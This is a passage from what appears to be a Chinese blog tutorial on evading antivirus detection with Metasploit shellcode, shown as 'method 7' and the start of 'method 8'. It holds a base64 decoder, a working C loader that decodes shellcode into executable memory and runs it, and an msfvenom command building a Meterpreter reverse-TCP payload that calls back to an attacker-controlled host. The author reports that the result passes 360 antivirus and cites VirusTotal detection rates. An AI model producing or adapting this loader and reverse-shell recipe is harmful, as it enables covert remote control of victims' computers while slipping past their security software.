*/</span></span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">62</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>,  <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>,</span><br><span class="line">    <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>,</span><br><span class="line">    <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Base64decode_len</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bufcoded)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> nbytesdecoded;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *bufin;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> nprbytes;</span><br><span class="line"></span><br><span class="line">    bufin = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded;</span><br><span class="line">    <span class="keyword">while</span> (pr2six[*(bufin++)] &lt;= <span class="number">63</span>);</span><br><span class="line"></span><br><span class="line">    nprbytes = (bufin - (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded) - <span class="number">1</span>;</span><br><span class="line">    nbytesdecoded = ((nprbytes + <span class="number">3</span>) / <span class="number">4</span>) * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> nbytesdecoded + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Base64decode</span><span class="params">(<span class="type">char</span> *bufplain, <span class="type">const</span> <span class="type">char</span> *bufcoded)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> nbytesdecoded;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *bufin;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">unsigned</span> <span class="type">char</span> *bufout;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> nprbytes;</span><br><span class="line"></span><br><span class="line">    bufin = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded;</span><br><span class="line">    <span class="keyword">while</span> (pr2six[*(bufin++)] &lt;= <span class="number">63</span>);</span><br><span class="line">    nprbytes = (bufin - (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded) - <span class="number">1</span>;</span><br><span class="line">    nbytesdecoded = ((nprbytes + <span class="number">3</span>) / <span class="number">4</span>) * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    bufout = (<span class="type">unsigned</span> <span class="type">char</span> *)bufplain;</span><br><span class="line">    bufin = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (nprbytes &gt; <span class="number">4</span>) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[*bufin] &lt;&lt; <span class="number">2</span> | pr2six[bufin[<span class="number">1</span>]] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[bufin[<span class="number">1</span>]] &lt;&lt; <span class="number">4</span> | pr2six[bufin[<span class="number">2</span>]] &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[bufin[<span class="number">2</span>]] &lt;&lt; <span class="number">6</span> | pr2six[bufin[<span class="number">3</span>]]);</span><br><span class="line">        bufin += <span class="number">4</span>;</span><br><span class="line">        nprbytes -= <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note: (nprbytes == 1) would be an error, so just ingore that case */</span></span><br><span class="line">    <span class="keyword">if</span> (nprbytes &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[*bufin] &lt;&lt; <span class="number">2</span> | pr2six[bufin[<span class="number">1</span>]] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nprbytes &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[bufin[<span class="number">1</span>]] &lt;&lt; <span class="number">4</span> | pr2six[bufin[<span class="number">2</span>]] &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nprbytes &gt; <span class="number">3</span>) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[bufin[<span class="number">2</span>]] &lt;&lt; <span class="number">6</span> | pr2six[bufin[<span class="number">3</span>]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(bufout++) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    nbytesdecoded -= (<span class="number">4</span> - nprbytes) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> nbytesdecoded;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> basis_64[] =</span><br><span class="line"><span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Base64encode_len</span><span class="params">(<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ((len + <span class="number">2</span>) / <span class="number">3</span> * <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Base64encode</span><span class="params">(<span class="type">char</span> *encoded, <span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line"></span><br><span class="line">    p = encoded;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">2</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">        *p++ = basis_64[(<span class="built_in">string</span>[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">        *p++ = basis_64[((<span class="built_in">string</span>[i] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">            ((<span class="type">int</span>)(<span class="built_in">string</span>[i + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">        *p++ = basis_64[((<span class="built_in">string</span>[i + <span class="number">1</span>] &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">2</span>) |</span><br><span class="line">            ((<span class="type">int</span>)(<span class="built_in">string</span>[i + <span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">        *p++ = basis_64[<span class="built_in">string</span>[i + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; len) &#123;</span><br><span class="line">        *p++ = basis_64[(<span class="built_in">string</span>[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">        <span class="keyword">if</span> (i == (len - <span class="number">1</span>)) &#123;</span><br><span class="line">            *p++ = basis_64[((<span class="built_in">string</span>[i] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>)];</span><br><span class="line">            <span class="comment">//    *p++ = &#x27;=&#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            *p++ = basis_64[((<span class="built_in">string</span>[i] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">                ((<span class="type">int</span>)(<span class="built_in">string</span>[i + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">            *p++ = basis_64[((<span class="built_in">string</span>[i + <span class="number">1</span>] &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">2</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//*p++ = &#x27;=&#x27;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *p++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> p - encoded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>base64.h</code>文件内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _BASE64_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BASE64_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">Base64encode_len</span><span class="params">(<span class="type">int</span> len)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">Base64encode</span><span class="params">(<span class="type">char</span> * coded_dst, <span class="type">const</span> <span class="type">char</span> *plain_src, <span class="type">int</span> len_plain_src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">Base64decode_len</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * coded_src)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">Base64decode</span><span class="params">(<span class="type">char</span> * plain_dst, <span class="type">const</span> <span class="type">char</span> *coded_src)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//_BASE64_H_</span></span></span><br></pre></td></tr></table></figure>

<p><code>shellcode.c</code>文件内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;msf base64 code here&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原po代码报错，这里做了一些强制转换和类型修正</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str1[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    Base64decode(str1, (<span class="type">char</span>*)buf);</span><br><span class="line">    LPVOID Memory;</span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, str1, <span class="keyword">sizeof</span>(str1));</span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用msf生成base64编码的shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c &gt; shell.c</span><br></pre></td></tr></table></figure>

<p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。vs2019编译，关闭杀软，msf可成功上线。</p>
<p>打开杀软，火绒可以查杀，<strong>360不能查杀</strong>（原po火绒静态查杀会报毒，但行为检测没有反应，360全通过）。</p>
<p>virustotal.com查杀率为21&#x2F;68（原po为28&#x2F;69）。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/./images/202205301526558.png" alt="image-20220530152630449"></p>
<h3 id="方法8-base64加密2（VT免杀率17-67）"><a href="#方法8-base64加密2（VT免杀率17-67）" class="headerlink" title="方法8 base64加密2（VT免杀率17&#x2F;67）"></a>方法8 base64加密2（VT免杀率17&#x2F;67）</h3><p>另外一种base64加密方式，和方法7类似，实现代码略有不同。</p>
<p><code>base64.c</code>文件内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  base64.c</span></span><br><span class="line"><span class="comment">//  base64</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by guofu on 2017/5/25.</span></span><br><span class="line"><span class="comment">//  Copyright © 2017年 guofu. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*  转解码过程</span></span><br><span class="line"><span class="comment">*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24</span></span><br><span class="line"><span class="comment">*  先将要编码的转成对应的ASCII值</span></span><br><span class="line"><span class="comment">*  如编码: s 1 3</span></span><br><span class="line"><span class="comment">*  对应ASCII值为: 115 49 51</span></span><br><span class="line"><span class="comment">*  对应二进制为: 01110011 00110001 00110011</span></span><br><span class="line"><span class="comment">*  将其6个分组分4组: 011100 110011 000100 110011</span></span><br><span class="line"><span class="comment">*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:</span></span><br><span class="line"><span class="comment">*  00011100 00110011 00000100 00110011对应:28 51 4 51</span></span><br><span class="line"><span class="comment">*  查找base64 转换表 对应 c z E z</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*  解码</span></span><br><span class="line"><span class="comment">*  c z E z</span></span><br><span class="line"><span class="comment">*  对应ASCII值为 99 122 69 122</span></span><br><span class="line"><span class="comment">*  对应表base64_suffix_map的值为 28 51 4 51</span></span><br><span class="line"><span class="comment">*  对应二进制值为 00011100 00110011 00000100 00110011</span></span><br><span class="line"><span class="comment">*  依次去除每组的前两位, 再拼接成3字节</span></span><br><span class="line"><span class="comment">*  即: 01110011 00110001 00110011</span></span><br><span class="line"><span class="comment">*  对应的就是s 1 3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// base64 转换表, 共64个</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> base64_alphabet[] = &#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码时使用</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> base64_suffix_map[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">253</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">255</span>, <span class="number">253</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">    <span 